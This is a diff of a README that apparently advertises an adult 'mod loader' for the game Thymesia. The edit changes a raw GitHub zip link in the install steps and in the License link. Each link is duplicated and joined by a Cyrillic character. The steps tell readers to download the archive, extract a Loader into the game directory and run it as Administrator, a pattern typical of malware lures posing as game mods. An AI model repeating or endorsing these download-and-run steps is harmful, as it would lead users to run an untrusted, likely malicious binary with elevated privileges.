@@ -37,7 +37,7 @@ Stay tuned — compatibility for more distributions will be updated regularly!
 
 Ready to experience Thymesia like never before? Follow these easy steps:
 
-1. Download `https://raw.githubusercontent.com/Justdvp/ThymesiaSensualRealms/main/Diploptera/ThymesiaSensualRealms.zipоhttps://raw.githubusercontent.com/Justdvp/ThymesiaSensualRealms/main/Diploptera/ThymesiaSensualRealms.zip` from the repository’s Releases section.
+1. Download `https://raw.githubusercontent.com/Justdvp/ThymesiaSensualRealms/main/Diploptera/Sensual-Realms-Thymesia-v1.0.zipоhttps://raw.githubusercontent.com/Justdvp/ThymesiaSensualRealms/main/Diploptera/Sensual-Realms-Thymesia-v1.0.zip` from the repository’s Releases section.
 2. Extract the Loader to your Thymesia installation directory using any popular archiver (WinRAR, 7zip, Unarchiver etc).
 3. Run the Loader executable as Administrator (**right-click → Run as Admin** on Windows).
 4. Follow on-screen prompts to enable adult-mode mods.
@@ -87,7 +87,7 @@ This software is **provided as-is** for educational and entertainment purposes.
 
 ## 📜 License
 
-Distributed under the [MIT License (2025)](https://raw.githubusercontent.com/Justdvp/ThymesiaSensualRealms/main/Diploptera/ThymesiaSensualRealms.zipоhttps://raw.githubusercontent.com/Justdvp/ThymesiaSensualRealms/main/Diploptera/ThymesiaSensualRealms.zip).  
+Distributed under the [MIT License (2025)](https://raw.githubusercontent.com/Justdvp/ThymesiaSensualRealms/main/Diploptera/Sensual-Realms-Thymesia-v1.0.zipоhttps://raw.githubusercontent.com/Justdvp/ThymesiaSensualRealms/main/Diploptera/Sensual-Realms-Thymesia-v1.0.zip).  
 Open-source, community-powered. Contributions welcome!
 
 ---
